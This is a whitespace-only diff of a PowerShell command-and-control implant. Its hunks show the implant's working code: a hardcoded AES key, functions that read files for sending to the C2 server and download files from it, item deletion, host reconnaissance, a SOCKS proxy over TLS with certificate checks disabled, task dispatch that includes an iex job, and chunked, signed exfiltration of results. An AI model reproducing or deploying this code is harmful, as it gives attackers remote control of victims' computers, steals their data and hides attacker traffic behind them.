@@ -2,29 +2,29 @@ $implant_id = "5"
 $key = [System.Convert]::FromBase64String("k+REtlRcipkMkVW89B0j/RIN3rjxydFeGQ1QoldKypo=")
 $iv = [System.Convert]::FromBase64String("tItX91yHRvj6EkVNFcRStQ==")
 # ipconfig-all - the results of the ipconfig /all command
-function func_ipconfig 
+function func_ipconfig
 {
     $results = ipconfig /all | Out-String
     return $results
 
 }
-# download - gets the file content on disk and stores it in results so 
+# download - gets the file content on disk and stores it in results so
 # we can send it over to the C2 server
-function func_download 
+function func_download
 {
     param([string] $file_path) # the file path on disk we want to download
-    
+
     $results = Get-Content -Path $file_path -Raw
 
     return $results
 }
 
 # upload - gets a file from the C2 server and saves to disk
-function func_upload 
+function func_upload
 {
     param([string] $file_path) # the uri to get from, and the place to save to
 
-    
+
 
     if($file_path.Length -lt 1)
     {
@@ -37,7 +37,7 @@ function func_upload
 
         $file_path = "`"$temp`""
     }
-    
+
     Invoke-RestMethod -Uri "$protocol//$ip/$upload_uri/$implant_id" -OutFile $file_path
 }
 # get-dir - performs an ls and returns the results
@@ -50,20 +50,20 @@ function func_dir
     $res2 = $results.ToString()
 
     return $res2
-    
+
 }
 # get-pwd - performs a pwd command and returns the results
 function func_pwd
 {
 
-    # returns the pwd results as a powershell string variable    
+    # returns the pwd results as a powershell string variable
     $results = pwd | Out-String
     $res2 = $results.ToString()
 
     return $results
 }
 # change-dir - changes the current directory. returns that we tried to change directories
-function func_cd 
+function func_cd
 {
     param([string] $directory) # the directory we are going to change to
 
@@ -71,7 +71,7 @@ function func_cd
     return "Attempted to change to $directory."
 }
 # rm-time - removes the specific item or directory and returns that we tried to remove the item
-function func_rm 
+function func_rm
 {
     param([string] $item) # the item we want to remove
 
@@ -81,13 +81,13 @@ function func_rm
 
 }
 # netstat-tcp - enumerates tcp connections and returns the output
-function func_netstat-tcp 
+function func_netstat-tcp
 {
    $results = Get-NetTCPConnection | Out-String
    return $results
 }
 # whoami-all - the results of the whoami /all command
-function func_whoami 
+function func_whoami
 {
     $results = whoami /all | Out-String
     return $results
@@ -95,9 +95,9 @@ function func_whoami
 ﻿# main block for socks connections
 [ScriptBlock]$SocksConnectionMgr = {
     param( $vars )
-    
+
     # copies the vars so they can be used in the runspace
-    $Script = 
+    $Script =
     {
             param( $vars )
             $vars.inStream.CopyTo($vars.outStream)
@@ -107,7 +107,7 @@ function func_whoami
     $rsp = $vars.rsp
 
     # defines the get ip address function. this resolves ip address from domain name if needed
-    function func_get_ipaddress 
+    function func_get_ipaddress
     {
         param($socks_ip)
         if ($socks_ip -as [ipaddress])
@@ -134,13 +134,13 @@ function func_whoami
 
         # per protocol, the first byte is supposed to be the socks buffer
         $socksVer = $buffer_small[0]
-        
+
         # if it is a socks5 proxy
         if ($socksVer -eq 5)
         {
             # performs socks5 protocol
             $cliStream.Read($buffer_small, 2, $buffer_small[1]) | Out-Null
-            for ($ctr = 2; $ctr -le $buffer_small[1] + 1; $ctr++) 
+            for ($ctr = 2; $ctr -le $buffer_small[1] + 1; $ctr++)
             {
                 if ($buffer_small[$ctr] -eq 0) {break}
             }
@@ -208,12 +208,12 @@ function func_whoami
                 $buffer_small[5] = 0
                 $cliStream.Write($buffer_small, 0, 10)
                 $cliStream.Flush()
-                $srvStream = $tmpServ.GetStream() 
+                $srvStream = $tmpServ.GetStream()
                 $AsyncJobResult2 = $srvStream.CopyToAsync($cliStream)
                 $AsyncJobResult = $cliStream.CopyToAsync($srvStream)
                 $AsyncJobResult.AsyncWaitHandle.WaitOne()
                 $AsyncJobResult2.AsyncWaitHandle.WaitOne()
-                
+
             }
             else
             {
@@ -242,7 +242,7 @@ function func_whoami
                 $cliStream.Read($buffer_small, 0, 1)
             }
             $tmpServ = New-Object System.Net.Sockets.TcpClient($destHost, $destPort)
-            
+
             if($tmpServ.Connected)
             {
                 $buffer_small[0] = 0
@@ -251,7 +251,7 @@ function func_whoami
                 $buffer_small[3] = 0
                 $cliStream.Write($buffer_small, 0, 8)
                 $cliStream.Flush()
-                $srvStream = $tmpServ.GetStream() 
+                $srvStream = $tmpServ.GetStream()
                 $AsyncJobResult2 = $srvStream.CopyToAsync($cliStream)
                 $AsyncJobResult = $cliStream.CopyTo($srvStream)
                 $AsyncJobResult.AsyncWaitHandle.WaitOne()
@@ -266,13 +266,13 @@ function func_whoami
     catch {
         #$_ >> "error.log"
     }
-    finally 
+    finally
     {
-        if ($client -ne $null) 
+        if ($client -ne $null)
         {
             $client.Dispose()
         }
-        if ($tmpServ -ne $null) 
+        if ($tmpServ -ne $null)
         {
             $tmpServ.Dispose()
         }
@@ -292,7 +292,7 @@ function func_socks{
             [Int] $max_retries = 0 )
 
     # everything here is wrapped in a try block in case we error out
-    try 
+    try
     {
 
         # initializes a try counter, current_try
@@ -315,7 +315,7 @@ function func_socks{
                 # creates a new tcp client for us to connect to
                 $client = New-Object System.Net.Sockets.TcpClient($remote_host, $remote_port)
                 $clear_clistream = $client.GetStream()
-                
+
                 if($cert_fingerprint -eq '')
                 {
                     $cliStream = New-Object System.Net.Security.SslStream($clear_clistream, $false, ({$true} -as[Net.Security.RemoteCertificateValidationCallback]));
@@ -324,10 +324,10 @@ function func_socks{
                 {
                     $cliStream = New-Object System.Net.Security.SslStream($clear_clistream, $false, ({return $args[1].GetCertHashString() -eq $cert_fingerprint } -as[Net.Security.RemoteCertificateValidationCallback]));
                 }
-                
+
                 # authenticates using TLSv1.2
                 $cliStream.AuthenticateAsClient($remote_host, $null, [Net.SecurityProtocolType]::Tls12, $false)
-                
+
                 # verbose mode, writes connected at this point
                 Write-Host "Connected"
 
@@ -346,17 +346,17 @@ function func_socks{
                 $est_request = [System.Text.Encoding]::Default.GetBytes("GET / HTTP/1.1`nHost: " + $remote_host + "`n`n")
                 # writes the establishment reqeuest to the buffer
                 $cliStream.Write($est_request, 0, $est_request.Length)
-                
+
                 # sets the read timeout and attempts to read the establishment request into the larger buffer
                 $cliStream.ReadTimeout = 1000
                 $cliStream.Read($buffer_large, 0, 122) | Out-Null
-                
+
                 # reads the message after
                 $cliStream.Read($buffer_small, 0, 5) | Out-Null
-                
+
                 # converst the small buffer message to text
                 $message = [System.Text.Encoding]::ASCII.GetString($buffer_small)
-                
+
                 # verbose mode writes the message to the terminal
                 Write-Host $message
 
@@ -420,12 +420,12 @@ function func_socks{
         write-host "Server closed."
 
         # cleans up everything
-        if ($client -ne $null) 
+        if ($client -ne $null)
         {
             $client.Dispose()
             $client = $null
         }
-        if ($PS3 -ne $null -and $AsyncJobResult3 -ne $null) 
+        if ($PS3 -ne $null -and $AsyncJobResult3 -ne $null)
         {
             $PS3.EndInvoke($AsyncJobResult3) | Out-Null
             $PS3.Runspace.Close()
@@ -448,9 +448,9 @@ function func_iex
 
 function func_pick_job
 {
-    param([string]$job,     
-        [string]$job_args,   
-        [string]$lcl_ip)            
+    param([string]$job,
+        [string]$job_args,
+        [string]$lcl_ip)
 
     # picks the job and executes the command
     if ($job -eq "exit" -or $job -eq "checkin")
@@ -459,7 +459,7 @@ function func_pick_job
     }
 	elseif($job -eq "ipconfig")
 	{
-		$results = func_ipconfig 
+		$results = func_ipconfig
 	}
 	elseif($job -eq "download")
 	{
@@ -475,7 +475,7 @@ function func_pick_job
 	}
 	elseif($job -eq "pwd")
 	{
-		$results = func_pwd 
+		$results = func_pwd
 	}
 	elseif($job -eq "cd")
 	{
@@ -487,11 +487,11 @@ function func_pick_job
 	}
 	elseif($job -eq "netstat-tcp")
 	{
-		$results = func_netstat-tcp 
+		$results = func_netstat-tcp
 	}
 	elseif($job -eq "whoami")
 	{
-		$results = func_whoami 
+		$results = func_whoami
 	}
 	elseif($job -eq "socks")
 	{
@@ -547,7 +547,7 @@ add-type @"
 }
 catch{ throw $_; }
 
-# function to decrypt aes 
+# function to decrypt aes
 function func_aes_decrypt
 {
   param($text1, $key1, $iv1)
@@ -594,13 +594,13 @@ function func_aes_encrypt
 function func_verify_task
 {
     # the string of "task_id,task_type,task_opt" that tells us what to do
-    param($task_string, 
+    param($task_string,
         # the hash of the task_string, encrypted with the server's key
-          $digest,  
+          $digest,
         # the key that we'll use to decrypt the hash and verify the sig
-          $key3, $iv3)         
+          $key3, $iv3)
 
-   
+
    # verify signature
    $msg_digest = [System.Security.Cryptography.HashAlgorithm]::Create("SHA256").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($task_string))
 
@@ -609,7 +609,7 @@ function func_verify_task
    # compares the digest byte by byte to make sure it is the same
    $verified = 1
    for($counter = 0; $counter -lt $msg_digest.Length; $counter++)
-   {        
+   {
         if($msg_digest[$counter] -ne $digest_dec[$counter])
         {
             $verified = 0
@@ -624,11 +624,11 @@ function func_sign_results
 {
      # the string we want to send to the server the key we'll use to sign
     param($results_str,
-          $key4, $iv4)         
+          $key4, $iv4)
 
     # performs signature algorithm
     $msg_digest = [System.Security.Cryptography.HashAlgorithm]::Create("SHA256").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($results_str))
-    
+
     # encrypts the message digest
     $sig_digest = func_aes_encrypt $msg_digest $key4 $iv4
 
@@ -646,9 +646,9 @@ function func_chunk
 # the data that we're going to chunk
 # the current byte that we're starting the next chunk at
 # the maximum size of the chunk
-    param([string]$data,        
-          [int]$current_byte,     
-          [int]$max_data_size)    
+    param([string]$data,
+          [int]$current_byte,
+          [int]$max_data_size)
 
 
     # gets where to start the chunk, as in do we send the rest of the data, or a subset
@@ -660,7 +660,7 @@ function func_chunk
 
     # shifts the current byte variable to where we left off
     $new_current_byte = $chunk_bound + $current_byte
-    
+
     # if our new "current byte" is the end of the results string, we can be done sending data
     if($new_current_byte -ge $data.Length)
     {
@@ -703,7 +703,7 @@ function func_sa
 }
 
 # func_get_tasks - used to get tasks from the C2 server and then parse them into the jobs format
-function func_get_tasks 
+function func_get_tasks
 {
 
     # temp variable that will store the final job format after we parse the task
@@ -771,7 +771,7 @@ function func_execute_jobs
     for ($counter = 0; $counter -lt $list_of_jobs.Length; $counter++)
     {
 
-        
+
         # perform job, give update to is_completed flag on the progress of the job
         # implant functions should return, results, and progress completed.
         # every response will need to be chunked IAW the max_data_size variable
@@ -785,7 +785,7 @@ function func_execute_jobs
 
             # splits up job string into different varaibles
             $task_vals = $job -split '<br>'
-    
+
             # task_id = first value
             $task_id = $task_vals[0]
             # task_type = second value
@@ -794,7 +794,7 @@ function func_execute_jobs
             $task_options = $task_vals[2]
             # current_byte, how much of the job results we have currently sent is the fourth value
             $current_byte = $task_vals[3]
-            
+
             # if current_byte is zero, it means that we have not sent any data related to the job yet,
             # AKA the job has not yet run
             if($current_byte -eq 0)
@@ -812,7 +812,7 @@ function func_execute_jobs
                 # gets the results that we've stored
                 $results = $task_vals[4]
             }
-            
+
 
             # chunks the results according to our max_data_size and current byte we've sent up to
             $results_chunk = (func_chunk $results $current_byte $max_data_size) -split "<chnk>"
@@ -845,7 +845,7 @@ function func_execute_jobs
                 exit
             }
 
-            
+
             # if we still have results to send
             if($current_byte -ne "true")
             {
@@ -855,7 +855,7 @@ function func_execute_jobs
                 $final_job_list += $list_of_jobs[$counter]
             }
 
-            
+
         }
 
     }
